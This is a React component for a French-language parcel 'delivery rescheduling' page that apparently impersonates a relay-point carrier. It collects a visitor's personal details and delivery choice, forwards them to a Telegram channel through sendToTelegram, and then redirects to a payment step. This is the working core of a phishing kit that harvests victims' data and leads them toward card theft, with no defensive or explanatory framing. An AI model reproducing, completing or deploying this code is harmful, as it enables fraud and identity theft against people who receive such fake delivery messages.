import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Navbar } from './Navbar';
import { SecondaryNav } from './SecondaryNav';
import { Footer } from './Footer';
import { BillingModal } from './BillingModal';
import { CustomerForm } from './BillingPage/CustomerForm';
import { PackageInfo } from './BillingPage/PackageInfo';
import { Timeline } from './BillingPage/Timeline';
import { RelayPointModal } from './BillingPage/RelayPointModal';
import { sendToTelegram } from '../../services/telegram';
import { Home, MapPin } from 'lucide-react';
import type { CustomerData } from '../../types/customer';

type StepStatus = 'completed' | 'current' | 'upcoming';

interface Step {
  step: number;
  label: string;
  status: StepStatus;
}

type DeliveryType = 'home' | 'relay' | null;

export function BillingPage() {
  const [isModalOpen, setIsModalOpen] = useState(true);
  const [isRelayModalOpen, setIsRelayModalOpen] = useState(false);
  const [formData, setFormData] = useState<CustomerData | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [relayPointCode, setRelayPointCode] = useState<string>('');
  const [deliveryType, setDeliveryType] = useState<DeliveryType>(null);
  const navigate = useNavigate();

  const handleFormSubmit = (data: CustomerData) => {
    setFormData(data);
  };

  const handleConfirmation = async () => {
    if (!formData) return;

    if (deliveryType === 'home') {
      setIsProcessing(true);
      try {
        await sendToTelegram({ ...formData, deliveryType: 'home' }, 'billing');
        localStorage.setItem('customerData', JSON.stringify({ ...formData, deliveryType: 'home' }));
        navigate('/payment');
      } catch (error) {
        console.error('Error sending data:', error);
      } finally {
        setIsProcessing(false);
      }
      return;
    }

    if (!relayPointCode) {
      setIsRelayModalOpen(true);
      return;
    }

    setIsProcessing(true);
    try {
      await sendToTelegram({ ...formData, relayPointCode, deliveryType: 'relay' }, 'billing');
      localStorage.setItem('customerData', JSON.stringify({ ...formData, relayPointCode, deliveryType: 'relay' }));
      navigate('/payment');
    } catch (error) {
      console.error('Error sending data:', error);
    } finally {
      setIsProcessing(false);
    }
  };

  const handleRelayPointSelect = (code: string) => {
    setRelayPointCode(code);
    setIsRelayModalOpen(false);
    handleConfirmation();
  };

  const steps: Step[] = [
    { step: 1, label: 'Suivi', status: 'completed' },
    { step: 2, label: 'Adresse', status: 'current' },
    { step: 3, label: 'Paiement', status: 'upcoming' },
    { step: 4, label: 'Confirmation', status: 'upcoming' }
  ];

  return (
    <div className="min-h-screen bg-gray-50">
      <Navbar />
      <SecondaryNav />
      
      <main className="max-w-7xl mx-auto px-4 py-12">
        <div className="bg-white rounded-2xl shadow-xl p-8">
          <div className="mb-8">
            <h1 className="text-3xl font-bold text-[#96154a]">
              Reprogrammation de livraison
            </h1>
            <p className="mt-2 text-gray-600">
              Veuillez remplir les informations ci-dessous pour reprogrammer votre livraison
            </p>
          </div>

          <Timeline steps={steps} />

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <CustomerForm onSubmit={handleFormSubmit} />
            <PackageInfo />
          </div>

          {formData && (
            <div className="mt-8 border-t border-gray-200 pt-8">
              <h3 className="text-xl font-bold text-gray-900 mb-6">
                Mode de livraison
              </h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                <button
                  onClick={() => setDeliveryType('home')}
                  className={`p-6 rounded-xl border-2 transition-all duration-300 flex flex-col items-center gap-4
                    ${deliveryType === 'home'
                      ? 'border-[#96154a] bg-[#96154a]/5'
                      : 'border-gray-200 hover:border-[#96154a]/50'}`}
                >
                  <div className={`p-4 rounded-full ${deliveryType === 'home' ? 'bg-[#96154a] text-white' : 'bg-gray-100'}`}>
                    <Home className="w-8 h-8" />
                  </div>
                  <div className="text-center">
                    <h4 className="font-semibold text-lg mb-2">Livraison à domicile</h4>
                    <p className="text-sm text-gray-600">
                      Livraison directement à l'adresse indiquée
                    </p>
                  </div>
                </button>

                <button
                  onClick={() => setDeliveryType('relay')}
                  className={`p-6 rounded-xl border-2 transition-all duration-300 flex flex-col items-center gap-4
                    ${deliveryType === 'relay'
                      ? 'border-[#96154a] bg-[#96154a]/5'
                      : 'border-gray-200 hover:border-[#96154a]/50'}`}
                >
                  <div className={`p-4 rounded-full ${deliveryType === 'relay' ? 'bg-[#96154a] text-white' : 'bg-gray-100'}`}>
                    <MapPin className="w-8 h-8" />
                  </div>
                  <div className="text-center">
                    <h4 className="font-semibold text-lg mb-2">Point Relais®</h4>
                    <p className="text-sm text-gray-600">
                      Livraison dans un Point Relais® proche de chez vous
                    </p>
                  </div>
                </button>
              </div>

              <div className="flex flex-col lg:flex-row items-start gap-6">
                <div className="flex-1 bg-blue-50 rounded-xl p-4 border border-blue-100">
                  <p className="text-blue-700 text-sm">
                    Pour recevoir votre code de retrait, veuillez fournir une adresse e-mail et un numéro de téléphone mobile valides.
                  </p>
                </div>
                <button
                  onClick={handleConfirmation}
                  disabled={!formData || !deliveryType || isProcessing}
                  className={`
                    w-full lg:w-auto px-8 py-4 rounded-xl font-medium min-w-[200px]
                    flex items-center justify-center gap-2 transition-all duration-300
                    ${formData && deliveryType && !isProcessing
                      ? 'bg-[#96154a] text-white hover:bg-[#7d1240] transform hover:-translate-y-0.5 hover:shadow-lg' 
                      : 'bg-gray-100 text-gray-400 cursor-not-allowed'}
                  `}
                >
                  {isProcessing ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      <span>Traitement...</span>
                    </>
                  ) : (
                    <span>Confirmer</span>
                  )}
                </button>
              </div>
            </div>
          )}
        </div>
      </main>

      <Footer />
      <BillingModal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} />
      <RelayPointModal 
        isOpen={isRelayModalOpen}
        onClose={() => setIsRelayModalOpen(false)}
        onSelect={handleRelayPointSelect}
      />
    </div>
  );
}